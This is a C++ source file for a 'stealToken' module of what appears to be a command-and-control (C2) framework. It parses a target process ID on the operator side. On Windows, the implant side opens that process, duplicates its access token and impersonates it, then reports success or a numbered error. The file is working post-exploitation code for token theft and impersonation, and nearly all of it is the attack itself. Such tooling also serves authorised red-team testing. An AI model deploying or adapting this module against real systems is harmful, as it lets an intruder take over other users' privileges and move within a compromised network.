#include "StealToken.hpp"

#include <cstring>

#include "Common.hpp"

#ifdef __linux__

#elif _WIN32
#include <windows.h>
#endif

using namespace std;

#ifdef __linux__

#elif _WIN32

#endif

constexpr std::string_view moduleName = "stealToken";
constexpr unsigned long long moduleHash = djb2(moduleName);


#ifdef _WIN32

__declspec(dllexport) StealToken* StealTokenConstructor() 
{
    return new StealToken();
}

#else

__attribute__((visibility("default"))) StealToken* StealTokenConstructor() 
{
    return new StealToken();
}

#endif

StealToken::StealToken()
#ifdef BUILD_TEAMSERVER
    : ModuleCmd(std::string(moduleName), moduleHash)
#else
    : ModuleCmd("", moduleHash)
#endif
{
}

StealToken::~StealToken()
{
}

std::string StealToken::getInfo()
{
    std::string info;
#ifdef BUILD_TEAMSERVER
    info += "stealToken:\n";
    info += "Steal a token and impersonate the it. You must have administrator privilege. \n";
    info += "exemple:\n";
    info += "- stealToken pid \n";
#endif
    return info;
}

int StealToken::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS) || defined(C2CORE_BUILD_FUNCTIONAL_TESTS)
    if(splitedCmd.size() == 2)
    {
        int pid=-1;
        try
        {
            size_t consumed = 0;
            pid = stoi(splitedCmd[1], &consumed);
            if (consumed != splitedCmd[1].size())
            {
                c2Message.set_returnvalue(getInfo());
                return -1;
            }
        }
        catch (const std::exception&)
        {
            c2Message.set_returnvalue(getInfo());
            return -1;
        }

        if (pid <= 0)
        {
            c2Message.set_returnvalue(getInfo());
            return -1;
        }

        c2Message.set_instruction(splitedCmd[0]);
        c2Message.set_cmd("");
        c2Message.set_pid(pid);
    }
    else
    {
        c2Message.set_returnvalue(getInfo());
        return -1;
    }
#endif

    return 0;
}


int StealToken::process(C2Message &c2Message, C2Message &c2RetMessage)
{
    const int pid = c2Message.pid();
    c2RetMessage.set_instruction(c2Message.instruction());
    c2RetMessage.set_cmd("");
    c2RetMessage.set_returnvalue("");
    if (pid <= 0)
    {
        c2RetMessage.set_errorCode(1);
        return 0;
    }
#ifdef _WIN32
    HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, static_cast<DWORD>(pid));
    if (processHandle == nullptr)
    {
        c2RetMessage.set_errorCode(2);
        return 0;
    }
    HANDLE tokenHandle = nullptr;
    if (!OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_QUERY, &tokenHandle))
    {
        CloseHandle(processHandle);
        c2RetMessage.set_errorCode(3);
        return 0;
    }
    HANDLE duplicateHandle = nullptr;
    const BOOL duplicated = DuplicateTokenEx(tokenHandle, TOKEN_IMPERSONATE | TOKEN_QUERY,
        nullptr, SecurityImpersonation, TokenImpersonation, &duplicateHandle);
    CloseHandle(tokenHandle);
    CloseHandle(processHandle);
    if (!duplicated)
    {
        c2RetMessage.set_errorCode(4);
        return 0;
    }
    const BOOL impersonated = ImpersonateLoggedOnUser(duplicateHandle);
    CloseHandle(duplicateHandle);
    if (!impersonated)
    {
        c2RetMessage.set_errorCode(5);
        return 0;
    }
    c2RetMessage.set_errorCode(0);
    c2RetMessage.set_returnvalue("Token impersonated successfully.\n");
#else
    c2RetMessage.set_errorCode(6);
#endif
    return 0;
}

int StealToken::errorCodeToMsg(const C2Message &c2RetMessage, std::string& errorMsg)
{
#if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS) || defined(C2CORE_BUILD_FUNCTIONAL_TESTS)
    switch (c2RetMessage.errorCode())
    {
    case 0: errorMsg.clear(); break;
    case 1: errorMsg = "Failed: Invalid process ID."; break;
    case 2: errorMsg = "Failed to open the target process."; break;
    case 3: errorMsg = "Failed to open the target process token."; break;
    case 4: errorMsg = "Failed to duplicate the target token."; break;
    case 5: errorMsg = "Failed to impersonate the target token."; break;
    case 6: errorMsg = "StealToken is only supported on Windows."; break;
    default: errorMsg = "StealToken failed with an unknown error."; break;
    }
#endif
    return 0;
}
